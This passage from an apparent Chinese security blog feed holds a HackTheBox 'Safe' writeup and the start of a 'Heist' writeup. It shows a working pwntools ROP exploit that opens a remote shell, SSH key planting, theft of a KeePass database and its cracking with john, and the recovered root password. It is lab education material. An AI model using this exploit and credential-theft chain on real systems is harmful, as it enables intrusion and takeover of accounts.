myapp</span></span><br><span class="line">Reading symbols from myapp...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> myapp)</span><br><span class="line">gdb-peda$ <span class="built_in">set</span> follow-fork-mode parent</span><br><span class="line">gdb-peda$ pattern_create 200</span><br><span class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'</span></span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /root/htb/safe/myapp</span><br><span class="line">[Detaching after vfork from child process 79586]</span><br><span class="line"> 03:15:51 up 2 days,  2:44,  3 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line"></span><br><span class="line">What <span class="keyword">do</span> you want me to <span class="built_in">echo</span> back? AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x0</span><br><span class="line">RBX: 0x0</span><br><span class="line">RCX: 0x7ffff7ee0904 (&lt;__GI___libc_write+20&gt;:cmp    rax,0xfffffffffffff000)</span><br><span class="line">RDX: 0x7ffff7fb1580 --&gt; 0x0</span><br><span class="line">RSI: 0x405260 (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>...)</span><br><span class="line">RDI: 0x0</span><br><span class="line">RBP: 0x41414e4141384141 (<span class="string">'AA8AANAA'</span>)</span><br><span class="line">RSP: 0x7fffffffe348 (<span class="string">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">RIP: 0x4011ac (&lt;main+77&gt;:ret)</span><br><span class="line">R8 : 0xc9</span><br><span class="line">R9 : 0x0</span><br><span class="line">R10: 0x4003e0 --&gt; 0x6972700073747570 (<span class="string">'puts'</span>)</span><br><span class="line">R11: 0x246</span><br><span class="line">R12: 0x401070 (&lt;_start&gt;:xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe420 --&gt; 0x1</span><br><span class="line">R14: 0x0</span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x4011a1 &lt;main+66&gt;:call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x4011a6 &lt;main+71&gt;:mov    eax,0x0</span><br><span class="line">   0x4011ab &lt;main+76&gt;:leave</span><br><span class="line">=&gt; 0x4011ac &lt;main+77&gt;:ret</span><br><span class="line">   0x4011ad:nop    DWORD PTR [rax]</span><br><span class="line">   0x4011b0 &lt;__libc_csu_init&gt;:push   r15</span><br><span class="line">   0x4011b2 &lt;__libc_csu_init+2&gt;:mov    r15,rdx</span><br><span class="line">   0x4011b5 &lt;__libc_csu_init+5&gt;:push   r14</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffe348 (<span class="string">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0008| 0x7fffffffe350 (<span class="string">"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0016| 0x7fffffffe358 (<span class="string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0024| 0x7fffffffe360 (<span class="string">"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0032| 0x7fffffffe368 (<span class="string">"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0040| 0x7fffffffe370 (<span class="string">"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0048| 0x7fffffffe378 (<span class="string">"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0056| 0x7fffffffe380 (<span class="string">"AuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x00000000004011ac <span class="keyword">in</span> main ()</span><br></pre></td></tr></table></figure><p>可以看到输入了200个长度的字符串后引起了程序的报错（因为程序的返回地址被刚输入的字符串覆盖了，一个错误的地址导致了异常退出，这个错误的地址就是栈顶的值。），这时候我们取到栈顶的值来计算溢出长度。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line">jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120</span><br><span class="line">gdb-peda$ pattern_create</span><br></pre></td></tr></table></figure><p>得到溢出长度120。</p><h2 id="选择Gadgets"><a href="#选择Gadgets" class="headerlink" title="选择Gadgets"></a>选择Gadgets</h2><p>最终的目的是要获取shell，所以需要执行类似<code>system(&quot;/bin/sh&quot;)</code>的方法来获得一个shell，因为可以通过栈溢出控制程序执行流程，那么我就还需要两个东西：一个是system函数的地址，一个是”/bin/sh”字符串的地址。</p><p>先看一下程序本身有什么函数可以用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ info <span class="built_in">functions</span></span><br><span class="line">All defined <span class="built_in">functions</span>:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000000401000  _init</span><br><span class="line">0x0000000000401030  puts@plt</span><br><span class="line">0x0000000000401040  system@plt</span><br><span class="line">0x0000000000401050  <span class="built_in">printf</span>@plt</span><br><span class="line">0x0000000000401060  gets@plt</span><br><span class="line">0x0000000000401070  _start</span><br><span class="line">0x00000000004010a0  _dl_relocate_static_pie</span><br><span class="line">0x00000000004010b0  deregister_tm_clones</span><br><span class="line">0x00000000004010e0  register_tm_clones</span><br><span class="line">0x0000000000401120  __do_global_dtors_aux</span><br><span class="line">0x0000000000401150  frame_dummy</span><br><span class="line">0x0000000000401152  <span class="built_in">test</span></span><br><span class="line">0x000000000040115f  main</span><br><span class="line">0x00000000004011b0  __libc_csu_init</span><br><span class="line">0x0000000000401210  __libc_csu_fini</span><br><span class="line">0x0000000000401214  _fini</span><br></pre></td></tr></table></figure><p>有<code>system</code>，<code>gets</code>方法，所以可以调用通过gets方法读取<code>/bin/sh</code>，然后通过system调用。</p><p>通过使用ida反编译的时候可以看到程序的<code>.data</code>段是可写的，并且获取到地址为<code>0x404038h</code>。所以我们可以通过调用<code>gets</code>函数将<code>/bin/sh</code>写入到<code>0x404038h</code>中，然用调用<code>system(0x404038h)</code>即可。另外我们还需要一个跳转到<code>gets</code>函数的gadgets。</p><p>使用<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a>可以很方便地找到这个Gadgets：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:htb/safe <span class="comment"># ROPgadget --binary myapp --only "pop|ret" | grep rdi</span></span><br><span class="line">0x000000000040120b : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>按照这个思路写的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">"linux"</span>, arch=<span class="string">"amd64"</span>)</span><br><span class="line"><span class="comment">#context(log_level='DEBUG')</span></span><br><span class="line"></span><br><span class="line">junk = <span class="string">"A"</span>*<span class="number">120</span></span><br><span class="line"></span><br><span class="line">plt_gets = p64(<span class="number">0x401060</span>)</span><br><span class="line">plt_system = p64(<span class="number">0x401040</span>)</span><br><span class="line">pop_rdi = p64(<span class="number">0x40120b</span>)</span><br><span class="line">binsh = p64(<span class="number">0x404038</span>)</span><br><span class="line"></span><br><span class="line">payload = junk + pop_rdi + binsh + plt_gets + pop_rdi + binsh + plt_system</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"10.10.10.147"</span>, <span class="number">1337</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里Gadgets并不是唯一的，当可利用的Gadgets很多时，getshell的方法也不止一种，这里国外一个叫大佬写了几种其他的方法：<a href="https://0xdf.gitlab.io/2019/10/26/htb-safe.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/10/26/htb-safe.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:htb/safe <span class="comment"># python exp1.py</span></span><br><span class="line">[+] Opening connection to 10.10.10.147 on port 1337: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">user</span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>刚刚翻看服务器的时候看到家目录下有几张图片和<code>MyPasswords.kdbx</code>（这个不就是我因为记不住密码用的密码管理器，最后因为记不住密码管理器的密码导致所有密码都丢了的KeePass吗）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">IMG_0545.JPG</span><br><span class="line">IMG_0546.JPG</span><br><span class="line">IMG_0547.JPG</span><br><span class="line">IMG_0548.JPG</span><br><span class="line">IMG_0552.JPG</span><br><span class="line">IMG_0553.JPG</span><br><span class="line">myapp</span><br><span class="line">MyPasswords.kdbx</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure><p>有好几张图片，有个kdbx数据库，这个意思就蛮明显的了吧：kdbx是通过密码+图片来保护的。通过刚刚的方法获得shell之后，因为这台机子还开了22端口，所以可以将自己的公钥复制进来，就可以通过ssh连接了，然后下载文件下来进行爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:htb/safe <span class="comment"># cat ~/.ssh/id_rsa.pub | base64 -w0</span></span><br><span class="line">c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEUmZBbjhSK0FtWWV4RkJUdW1zTDBUekJOTHJCOUs1NG1VT1JBa1l3T3JOcDNrYnhrejBvWHlGckR0cGdWc2pWdDQ4SkFRS0J2UXBCMmlBY3ZoYk5mZjRwVTJhdWZmMkZ4Z....(省略)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEUmZBbjhSK0FtWWV4RkJUdW1zTDBUekJOTHJCOUs1NG1VT1JBa1l3T3JOcDNrYnhrejBvWHlGckR0cGdWc2pWdDQ4SkFRS0J2UXBCMmlBY3ZoYk5mZjRwVTJhdWZmMkZ4Z....(省略) | base64 -d &gt;&gt; /home/user/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># scp -i ~/id_rsa_generated user@10.10.10.147:~/IMG* .</span></span><br><span class="line">IMG_0545.JPG                                                       100% 1863KB 944.7KB/s   00:01    </span><br><span class="line">IMG_0546.JPG                                                       100% 1872KB   1.6MB/s   00:01    </span><br><span class="line">IMG_0547.JPG                                                       100% 2470KB   2.0MB/s   00:01    </span><br><span class="line">IMG_0548.JPG                                                       100% 2858KB   1.5MB/s   00:01    </span><br><span class="line">IMG_0552.JPG                                                       100% 1099KB   1.6MB/s   00:00    </span><br><span class="line">IMG_0553.JPG                                                       100% 1060KB   2.3MB/s   00:00    </span><br><span class="line">root@kali<span class="comment"># scp -i ~/id_rsa_generated user@10.10.10.147:~/*.kdbx .</span></span><br><span class="line">MyPasswords.kdbx                                                   100% 2446</span><br></pre></td></tr></table></figure><p>使用keepass2john来生成hash文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># keepass2john MyPasswords.kdbx &gt; MyPasswords.kdbx.john; for img in $(ls IMG*); do /opt/john/run/keepass2john -k $img MyPasswords.kdbx; done &gt;&gt; MyPasswords.kdbx.john</span></span><br><span class="line"></span><br><span class="line">root@kali<span class="comment"># cat MyPasswords.kdbx.john </span></span><br><span class="line">MyPasswords:<span class="variable">$keepass</span>$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96</span><br><span class="line">MyPasswords:<span class="variable">$keepass</span>$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae</span><br><span class="line">MyPasswords:<span class="variable">$keepass</span>$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162</span><br><span class="line">MyPasswords:<span class="variable">$keepass</span>$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7</span><br><span class="line">MyPasswords:<span class="variable">$keepass</span>$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f</span><br><span class="line">MyPasswords:<span class="variable">$keepass</span>$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794</span><br><span class="line">MyPasswords:<span class="variable">$keepass</span>$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2</span><br></pre></td></tr></table></figure><p>做过几台htb的机子后感觉这里的爆破都用<code>rockyou.txt</code>字典都能跑出来（不过rockyou.txt有点大，先从小的试起），使用<code>john</code>来爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># john MyPasswords.kdbx.john /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt </span></span><br><span class="line">Warning: only loading hashes of <span class="built_in">type</span> <span class="string">"KeePass"</span>, but also saw <span class="built_in">type</span> <span class="string">"tripcode"</span></span><br><span class="line">Use the <span class="string">"--format=tripcode"</span> option to force loading hashes of that <span class="built_in">type</span> instead</span><br><span class="line">Warning: only loading hashes of <span class="built_in">type</span> <span class="string">"KeePass"</span>, but also saw <span class="built_in">type</span> <span class="string">"descrypt"</span></span><br><span class="line">Use the <span class="string">"--format=descrypt"</span> option to force loading hashes of that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 7 password hashes with 7 different salts (KeePass [SHA256 AES 32/64 OpenSSL])</span><br><span class="line">Cost 1 (iteration count) is 60000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (version) is 2 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 3 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">bullshit         (MyPasswords)</span><br><span class="line">1g 0:00:01:20 0.47% 2/3 (ETA: 15:46:09) 0.01239g/s 91.21p/s 154.1c/s 154.1C/s emerald..francesco</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session aborted</span><br></pre></td></tr></table></figure><p>拿到密码后打开密码管理器看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># kpcli --key IMG_0547.JPG --kdb MyPasswords.kdbx</span></span><br><span class="line">Please provide the master password: *************************</span><br><span class="line"></span><br><span class="line">KeePass CLI (kpcli) v3.1 is ready <span class="keyword">for</span> operation.</span><br><span class="line">Type <span class="string">'help'</span> <span class="keyword">for</span> a description of available commands.</span><br><span class="line">Type <span class="string">'help &lt;command&gt;'</span> <span class="keyword">for</span> details on individual commands.</span><br><span class="line"></span><br><span class="line">kpcli:/&gt; ls</span><br><span class="line">=== Groups ===</span><br><span class="line">MyPasswords/</span><br><span class="line">kpcli:/&gt; <span class="built_in">cd</span> MyPasswords/</span><br><span class="line">kpcli:/MyPasswords&gt; ls</span><br><span class="line">=== Groups ===</span><br><span class="line">eMail/</span><br><span class="line">General/</span><br><span class="line">Homebanking/</span><br><span class="line">Internet/</span><br><span class="line">Network/</span><br><span class="line">Recycle Bin/</span><br><span class="line">Windows/</span><br><span class="line">=== Entries ===</span><br><span class="line">0. Root password</span><br><span class="line">kpcli:/MyPasswords&gt; show -f R</span><br><span class="line">Recycle\ Bin/   Root\ password</span><br><span class="line">kpcli:/MyPasswords&gt; show -f Root\ password</span><br><span class="line"></span><br><span class="line"> Path: /MyPasswords/</span><br><span class="line">Title: Root password</span><br><span class="line">Uname: root</span><br><span class="line"> Pass: u3v2249dl9ptv465cogl3cnpo3fyhk</span><br><span class="line">  URL:</span><br><span class="line">Notes:</span><br></pre></td></tr></table></figure><p>使用<code>su -</code>命令提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@safe:~$ su -</span><br><span class="line">Password:</span><br><span class="line">root@safe:~<span class="comment"># cat root.txt</span></span><br><span class="line">d7af235eb1.....</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这是一篇writeup，靶机是来自hackthebox的&lt;a href=&quot;https://www.hackthebox.eu/home/ma
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://danta.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HTB heist Writeup</title>
    <link href="https://danta.fun/2019/12/11/htb-heist/"/>
    <id>https://danta.fun/2019/12/11/htb-heist/</id>
    <published>2019-12-11T14:02:56.000Z</published>
    <updated>2019-12-17T15:50:36.155Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一篇writeup，靶机是来自hackthebox的<a href="https://www.hackthebox.eu/home/machines/profile/201" target="_blank" rel="noopener">heist</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>使用nmap扫一下端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p- -sV -sC -sS 10.10.10.149</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-11 09:53 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.149</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 65530 filtered ports</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 38s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2019-12-11T15:58:12</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 3906.87 seconds</span><br></pre></td></tr></table></figure><p>80 web服务 445 smb服务 5985 winrm 135/49968 rpc</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>主机上开着Web服务，打开是一个登录页面。页面上有个以游客访问的功能，可以看到里面有人上传的一个配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 